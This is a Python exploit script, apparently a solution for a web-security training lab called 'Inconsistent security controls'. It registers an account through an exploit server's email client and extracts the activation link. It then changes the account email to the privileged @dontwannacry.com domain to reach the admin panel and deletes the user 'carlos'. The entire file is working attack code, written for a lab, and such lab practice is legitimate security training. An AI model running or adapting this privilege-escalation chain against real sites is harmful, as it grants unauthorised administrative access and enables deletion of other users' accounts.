"""
    Lab: Inconsistent security controls

    Exploitation Steps:
    1. Retrieve CSRF token for registration
    2. Register a new user 
    3. Access exploit server's email client and extract activation link
    4. Complete registration using that link
    5. Log in with the new user
    6. Change the email to @dontwannacry.com domain
    7. Delete 'carlos' user from admin panel

    Author: N00BCYB0T (adapted)
"""

import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None
EXPLOIT_DOMAIN = None
USERNAME = "user1"
PASSWORD = "user1234"

def main():
    global URL, EXPLOIT_DOMAIN

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('-e', '--exploit', required=True, help='Exploit server domain (e.g., exploit-id.exploit-server.net)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    EXPLOIT_DOMAIN = args.exploit
    session = requests.Session()

    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    print(f"{Fore.YELLOW}Fetching registration page...{Fore.RESET}")
    response = fetch(session, "/register")
    csrf_token = get_csrf(response.text)

    print(f"{Fore.YELLOW}Registering new user...{Fore.RESET}")
    data = {
        "username": USERNAME,
        "password": PASSWORD,
        "email": f"any@{EXPLOIT_DOMAIN}",
        "csrf": csrf_token
    }
    register(session, data)

    print(f"{Fore.YELLOW}Fetching email client from exploit server...{Fore.RESET}")
    email_page = fetch(session, f"https://{EXPLOIT_DOMAIN}/email")
    activation_link = extract_activation_link(email_page.text)

    print(f"{Fore.YELLOW}Activating the account using link...{Fore.RESET}")
    requests.get(activation_link, verify=False)

    print(f"{Fore.YELLOW}Logging in as new user...{Fore.RESET}")
    response = fetch(session, "/login")
    csrf_token = get_csrf(response.text)
    data = {
        "username": USERNAME,
        "password": PASSWORD,
        "csrf": csrf_token
    }
    login(session, data)

    print(f"{Fore.YELLOW}Fetching /my-account page...{Fore.RESET}")
    response = fetch(session, "/my-account")
    csrf_token = get_csrf(response.text)

    data = {
        "email": "anything@dontwannacry.com",
        "csrf": csrf_token
    }
    change_email(session, data)

    print(f"{Fore.YELLOW}Deleting user 'carlos' from admin panel...{Fore.RESET}")
    fetch(session, "/admin/delete?username=carlos")

    response = fetch(session, "/")
    if "Congratulations, you solved the lab!" in response.text:
        print(f"{Fore.GREEN}[+] Lab solved!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Lab not solved!{Fore.RESET}")

def fetch(session, path):
    try:
        url = path if path.startswith("http") else f"{URL}{path}"
        return session.get(url, allow_redirects=False)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to fetch {path}: {e}{Fore.RESET}")
        exit(1)

def register(session, data):
    try:
        session.post(f"{URL}/register", data=data, allow_redirects=False)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to register: {e}{Fore.RESET}")
        exit(1)

def login(session, data):
    try:
        session.post(f"{URL}/login", data=data, allow_redirects=False)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to login: {e}{Fore.RESET}")
        exit(1)

def change_email(session, data):
    try:
        session.post(f"{URL}/my-account/change-email", data=data, allow_redirects=False)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to change email: {e}{Fore.RESET}")

def get_csrf(text):
    match = re.search(r'csrf\" value=\"(.+?)\"', text)
    if not match:
        print(f"{Fore.RED}[-] CSRF token not found!{Fore.RESET}")
        exit(1)
    print(f"{Fore.GREEN}[+] Found CSRF Token: {match.group(1)}{Fore.RESET}")
    return match.group(1)

def extract_activation_link(html):
    match = re.search(r'>(https://.+?)</a>', html)
    if not match:
        print(f"{Fore.RED}[-] Activation link not found in email!{Fore.RESET}")
        exit(1)
    print(f"{Fore.GREEN}[+] Activation link extracted!{Fore.RESET}")
    return match.group(1)

if __name__ == "__main__":
    main()
